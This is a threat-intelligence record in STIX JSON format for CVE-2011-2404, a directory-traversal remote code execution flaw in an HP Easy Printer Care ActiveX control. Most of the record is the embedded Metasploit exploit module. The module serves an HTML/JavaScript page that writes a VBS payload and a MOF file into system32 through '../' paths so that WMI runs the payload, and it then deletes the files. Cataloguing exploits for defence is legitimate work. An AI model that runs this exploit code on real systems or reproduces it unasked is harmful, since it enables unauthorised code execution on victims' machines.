{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c20055c6-96d0-4c59-91a4-94d55f4a82b6",
    "created": "2024-08-14T16:43:43.984837Z",
    "modified": "2024-08-14T16:43:43.984842Z",
    "name": "HP Easy Printer Care XMLSimpleAccessor Class ActiveX Control Remote Code Execution",
    "description": " This module allows remote attackers to place arbitrary files on a users file system by abusing via Directory Traversal attack the \"saveXML\" method from the \"XMLSimpleAccessor\" class in the HP Easy Printer HPTicketMgr.dll ActiveX Control (HPTicketMgr.dll 2.7.2.0).  Code execution can be achieved by first uploading the payload to the remote machine embeddeding a vbs file, and then upload another mof file, which enables Windows Management Instrumentation service to execute the vbs. Please note that this module currently only works for Windows before Vista.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/hp_easy_printer_care_xmlsimpleaccessor.rb",
            "external_id": "hp_easy_printer_care_xmlsimpleaccessor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2404"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HP Easy Printer Care XMLSimpleAccessor Class ActiveX Control Remote Code Execution',\n        'Description' => %q{\n          This module allows remote attackers to place arbitrary files on a users file\n          system by abusing via Directory Traversal attack the \"saveXML\" method from the\n          \"XMLSimpleAccessor\" class in the HP Easy Printer HPTicketMgr.dll ActiveX Control\n          (HPTicketMgr.dll 2.7.2.0).\n\n          Code execution can be achieved by first uploading the payload to the remote\n          machine embeddeding a vbs file, and then upload another mof file, which enables Windows\n          Management Instrumentation service to execute the vbs. Please note that this\n          module currently only works for Windows before Vista.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Andrea Micalizzi', # aka rgod original discovery\n          'juan vazquez', # Original Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2011-2404'],\n          [ 'OSVDB', '74510'],\n          [ 'BID', '49100'],\n          [ 'ZDI', '11-261' ],\n        ],\n        'DefaultOptions' => {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n        'Payload' => {\n          'Space' => 2048,\n          'StackAdjustment' => -3500,\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          # Windows before Vista\n          [ 'Automatic', {} ],\n        ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2011-08-16',\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  #\n  # The following handles deleting the copied vbs payload and mof file\n  # See \"struts_code_exec.rb\" and \"ms10_026_dbldecode.rb\" for more information.\n  #\n  def on_new_session(client)\n    if client.type != \"meterpreter\"\n      print_error(\"NOTE: you must use a meterpreter payload in order to automatically cleanup.\")\n      print_error(\"The vbs payload and mof file must be removed manually.\")\n      return\n    end\n\n    return if not @var_mof_name\n    return if not @var_vbs_name\n\n    # stdapi must be loaded before we can use fs.file\n    client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n\n    cmd = \"C:\\\\windows\\\\system32\\\\attrib.exe -r \" +\n          \"C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\\" + @var_mof_name + \".mof\"\n    client.sys.process.execute(cmd, nil, { 'Hidden' => true })\n\n    begin\n      print_warning(\"Deleting the vbs payload \\\"#{@var_vbs_name}.vbs\\\" ...\")\n      client.fs.file.rm(\"C:\\\\windows\\\\system32\\\\\" + @var_vbs_name + \".vbs\")\n      print_warning(\"Deleting the mof file \\\"#{@var_mof_name}.mof\\\" ...\")\n      client.fs.file.rm(\"C:\\\\windows\\\\system32\\\\wbem\\\\mof\\\\good\\\\\" + @var_mof_name + \".mof\")\n    rescue ::Exception => e\n      print_error(\"Exception: #{e.inspect}\")\n    end\n  end\n\n  def on_request_uri(cli, request)\n    unless request['User-Agent'] =~ /MSIE/\n      print_error(\"Sending 404 for unknown user-agent\")\n      send_not_found(cli)\n      return\n    end\n\n    # Traversal directory attack calculated from default location:\n    # C:\\Program Files\\Common Files\\Hewlett-Packard\\HP Device Communication Services\\TicketServices\n\n    # Using Windows Management Instrumentation service to execute the payload.\n    # Using code from \"blackice_downloadimagefileurl.rb\". See it for more information.\n\n    var_xml_data_union = rand_text_alpha(rand(5) + 5)\n    var_xml_simple_accessor = rand_text_alpha(rand(5) + 5)\n    var_mof_function_name = rand_text_alpha(rand(5) + 5)\n    var_xml_tag = rand_text_alpha(rand(5) + 5)\n    var_xml_content = rand_text_alpha(rand(5) + 5)\n\n    content = <<-EOS\n    <html>\n    <head>\n    <script>\n      var #{var_xml_data_union} = new ActiveXObject('HPESPRIT.XMLDataUnion.1');\n      var #{var_xml_simple_accessor} = new ActiveXObject('HPESPRIT.XMLSimpleAccessor.1');\n\n      function #{var_mof_function_name}() {\n        try {\n          #{var_xml_data_union}.xml = \"<#{var_xml_tag}>#{var_xml_content}</#{var_xml_tag}>\";\n          #{var_xml_simple_accessor}.xmlDataUnion = #{var_xml_data_union};\n          #{var_xml_data_union}.xml = unescape(\"#{@mof_content}\");\n        } catch( e ) {\n          #{var_xml_simple_accessor}.SaveXML(\n            \"../../../../../WINDOWS/system32/wbem/mof/#{@var_mof_name}.mof\",\n            \"UTF-8\"\n          );\n        }\n      }\n\n      try {\n        #{var_xml_data_union}.xml = \"<#{var_xml_tag}>#{var_xml_content}</#{var_xml_tag}>\";\n        #{var_xml_simple_accessor}.xmlDataUnion = #{var_xml_data_union};\n        #{var_xml_data_union}.xml = unescape(\"#{@vbs_content}\");\n      } catch( e ) {\n        #{var_xml_simple_accessor}.SaveXML(\n          \"../../../../../WINDOWS/system32/#{@var_vbs_name}.vbs\",\n          \"UTF-8\"\n        );\n      }\n      setTimeout(\"#{var_mof_function_name}()\", 4000);\n    </script>\n    </head>\n    </html>\n    EOS\n\n    print_status(\"Sending #{self.name}\")\n    send_response_html(cli, content)\n    handler(cli)\n  end\n\n  def exploit\n    # In order to save binary data to the file system the payload is written to a .vbs\n    # file and execute it from there.\n    @var_mof_name = rand_text_alpha(rand(5) + 5)\n    @var_vbs_name = rand_text_alpha(rand(5) + 5)\n\n    print_status(\"Encoding payload into vbs...\")\n    payload = generate_payload_exe\n    @vbs_content = Rex::Text.to_hex(Msf::Util::EXE.to_exe_vbs(payload))\n\n    print_status(\"Generating mof file...\")\n    @mof_content = Rex::Text.to_hex(generate_mof(\"#{@var_mof_name}.mof\", \"#{@var_vbs_name}.vbs\"))\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-08-16",
    "x_mitre_platforms": [
        "win'"
    ]
}